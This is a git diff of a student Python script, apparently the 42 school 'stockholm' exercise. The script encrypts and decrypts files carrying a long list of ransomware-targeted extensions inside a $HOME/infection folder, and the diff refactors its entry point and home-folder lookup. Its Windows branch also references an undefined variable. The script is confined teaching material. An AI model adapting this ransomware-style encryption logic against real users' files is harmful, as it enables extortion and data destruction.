@@ -6,7 +6,7 @@
 #    By: tvillare <tvillare@student.42madrid.com    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2023/05/18 18:07:39 by tvillare          #+#    #+#              #
-#    Updated: 2023/05/22 13:06:46 by tvillare         ###   ########.fr        #
+#    Updated: 2023/05/27 17:11:17 by tvillare         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -22,7 +22,7 @@ import pyAesCrypt
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-from ft_encript import cifrar_archivo, descifrar_archivo, get_passwd, check_passwd
+from ft_encript import cifrar_archivo, descifrar_archivo, check_passwd
 from parser import parseo, ft_help
 
 exet = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf',
@@ -48,38 +48,36 @@ def	get_files(ruta_carpeta, ex_files):
 
 def	get_home():
 	if platform.system() == 'Windows': #Conprobar que funciona
-		print("Estás en un sistema Windows.")
-		home_drive = os.environ.get('HOMEDRIVE', '')
+		#home_drive = os.environ.get('HOMEDRIVE', '')
 		home_path = os.environ.get('HOMEPATH', '')
-		home = os.path.join(home_drive, home_path)
+		#home = os.path.join(home_drive, home_path)
 		print(home_directory)
 	elif platform.system() == 'Linux' or platform.system() == "Darwin":
-		home = os.environ['HOME']
+		if 'HOME' in os.environ:
+			home = os.environ['HOME']
+		else:
+			sys.exit()
 	if os.path.isdir(home + "/infection"):
 		return(home + "/infection")
-		#return "pruebas"
 	else:
 		print("NO Existe la carpeta infection en HOME o no es valida")
 		sys.exit()
 
-
-args = parseo()
-home = get_home()
-
-if args.h == True:
-	ft_help()
-elif args.v == True:
-	print("version stockholm 1.0")
-elif (args.r == True):
-	passwd = check_passwd(args.secret)
-	get_files(home, exet_ft)
-	for doc in files:
-		descifrar_archivo(doc, passwd, args.s)
-else:
-	#passwd = get_passwd()
-	passwd = check_passwd(args.secret)
-	get_files(home, exet)
-	for doc in files:
-		cifrar_archivo(doc, passwd, args.s)
-
-
+if __name__ == "__main__":
+	args = parseo()
+	if args.h == True:
+		ft_help()
+	elif args.v == True:
+		print("version stockholm 1.0")
+	elif (args.r == True):
+		home = get_home()
+		passwd = check_passwd(args.secret)
+		get_files(home, exet_ft)
+		for doc in files:
+			descifrar_archivo(doc, passwd, args.s)
+	else:
+		home = get_home()
+		passwd = check_passwd(args.secret)
+		get_files(home, exet)
+		for doc in files:
+			cifrar_archivo(doc, passwd, args.s)
